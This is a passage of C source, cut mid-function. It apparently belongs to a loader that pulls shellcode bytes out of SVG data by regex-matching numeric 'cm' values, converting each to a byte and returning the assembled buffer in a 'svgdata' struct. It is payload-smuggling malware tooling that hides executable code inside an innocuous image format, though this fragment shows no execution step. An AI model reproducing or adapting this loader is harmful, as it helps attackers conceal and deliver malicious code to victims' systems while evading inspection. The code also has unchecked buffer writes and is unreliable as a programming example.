        continue;
      }

      for (i = 0; i < rc; i++)
      {
        PCRE2_SPTR substring_start = subject + ovector[2*i];
        size_t substring_length = ovector[2*i+1] - ovector[2*i];
        sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
      }
    }

    // remove the "cm"
    strremove(temp, "cm");
    // Remove quote
    strremove(temp, "\"");

    int intVal = atoi(temp);

    holder[count] = intVal;

    pcre2_match_data_free(match_data);
    pcre2_code_free(re);
    memset(temp, '\0', strlen(temp));
    count++;
  }

    free(temp);

    unsigned char shellcode[count];

    for (int i = 0; i < count; ++i)
    {
        shellcode[i] = (unsigned char)holder[i];
    }

    struct svgdata* d = malloc(sizeof(struct svgdata));
    d->shellcode = malloc(count);
    memcpy(d->shellcode, shellcode, count);
    d->size = count;

    return d;
}